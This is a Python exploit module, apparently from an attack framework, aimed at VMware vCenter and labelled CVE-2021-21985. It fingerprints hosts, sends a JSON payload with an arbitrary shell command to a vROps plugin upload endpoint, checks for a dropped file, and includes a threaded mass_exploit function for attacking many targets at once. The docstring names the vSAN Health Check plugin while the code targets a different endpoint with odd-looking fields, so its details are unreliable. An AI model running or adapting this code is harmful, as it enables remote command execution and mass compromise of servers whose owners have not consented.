#!/usr/bin/env python3
"""
PoC for CVE-2021-21985 (VMware vCenter RCE via vSAN Health Check plugin).
"""

import json
import requests
import socket
import time
from urllib.parse import urljoin
from requests.packages.urllib3.exceptions import InsecureRequestWarning

from modules.config import load_config
from modules.logger import log_event

# Disable InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

cfg = load_config()
TIMEOUT = cfg.get("exploits", {}).get("impatient_timeout", 60)

def can_run_on(target: str, **kwargs):
    """
    Enhanced: Check if TCP 443 is open and /ui endpoint exists.
    Optionally fingerprint vCenter version if requested.
    """
    try:
        s = socket.socket()
        s.settimeout(5)
        s.connect((target, 443))
        s.close()
        r = requests.get(f"https://{target}/ui/", timeout=5, verify=False)
        if r.status_code == 200:
            # Optional: fingerprint version
            if kwargs.get("fingerprint", False):
                banner = r.text[:200]
                log_event("cve_2021_21985", f"vCenter banner: {banner}".encode())
            return True, ""
        else:
            return False, "UI endpoint responded with non-200"
    except Exception as e:
        return False, f"443 closed or no UI ({e})"

def exploit(target: str, payload_cmd: str = None, confirm_file: str = "/tmp/poctest", **kwargs):
    """
    Enhanced: 
    - Send crafted JSON to /ui/vropspluginui/rest/services/uploadova endpoint to trigger RCE.
    - payload_cmd: custom shell command to execute (default: touch/chmod).
    - confirm_file: file to check for existence after exploit.
    - Optionally run multiple payloads or confirm via multiple endpoints.
    - Logs all actions and errors.
    """
    url = f"https://{target}/ui/vropspluginui/rest/services/uploadova"
    if not payload_cmd:
        payload_cmd = "touch /tmp/poctest; chmod +x /tmp/poctest"
    json_payload = {
        "upgradeFilePath": "/tmp/pwned.sh",
        "vmwrexec_command": payload_cmd
    }
    headers = {"Content-Type": "application/json"}
    try:
        r = requests.post(url, json=json_payload, headers=headers, timeout=TIMEOUT, verify=False)
        if r.status_code == 200:
            # Try to confirm file existence via multiple endpoints
            confirmed = False
            confirm_urls = [
                f"https://{target}/download?file={confirm_file}",
                f"https://{target}/ui/download?file={confirm_file}",
                f"https://{target}/vcenter/download?file={confirm_file}"
            ]
            for c_url in confirm_urls:
                try:
                    check = requests.get(c_url, timeout=5, verify=False)
                    if check.status_code == 200 and ("pwned" in check.text or "test" in check.text or check.content):
                        log_event("cve_2021_21985", f"RCE confirmed on {target} via {c_url}".encode())
                        confirmed = True
                        break
                except Exception as ce:
                    log_event("cve_2021_21985", f"Confirm check failed: {ce}".encode())
            if confirmed:
                return {"status": True, "detail": f"{confirm_file} created"}
            else:
                log_event("cve_2021_21985", f"Exploit sent, could not confirm file on {target}".encode())
                return {"status": True, "detail": "Likely exploited, cannot confirm file"}
        else:
            log_event("cve_2021_21985", f"Exploit failed: HTTP {r.status_code} on {target}".encode())
            return {"status": False, "error": f"Exploit failed: HTTP {r.status_code}"}
    except Exception as e:
        log_event("cve_2021_21985", f"Exploit error: {e}".encode())
        return {"status": False, "error": str(e)}

def mass_exploit(targets, payload_cmd: str = None, threads: int = 5, delay: float = 0.0, **kwargs):
    """
    Dangerous: Mass exploit multiple vCenters in parallel.
    - targets: list of IPs/hostnames.
    - payload_cmd: custom shell command to execute.
    - threads: number of parallel threads.
    - delay: delay between launches.
    - Returns dict of results.
    """
    import threading
    import time as _time
    results = {}
    lock = threading.Lock()
    def worker(tgt):
        try:
            res = exploit(tgt, payload_cmd=payload_cmd, **kwargs)
            with lock:
                results[tgt] = res
        except Exception as e:
            log_event("cve_2021_21985", f"mass_exploit error for {tgt}: {e}".encode())
    thread_list = []
    for i, tgt in enumerate(targets):
        t = threading.Thread(target=worker, args=(tgt,), daemon=True)
        thread_list.append(t)
        t.start()
        if delay > 0 and i < len(targets) - 1:
            _time.sleep(delay)
        if len(thread_list) >= threads:
            for tt in thread_list:
                tt.join(timeout=TIMEOUT)
            thread_list = []
    for tt in thread_list:
        tt.join(timeout=TIMEOUT)
    return results
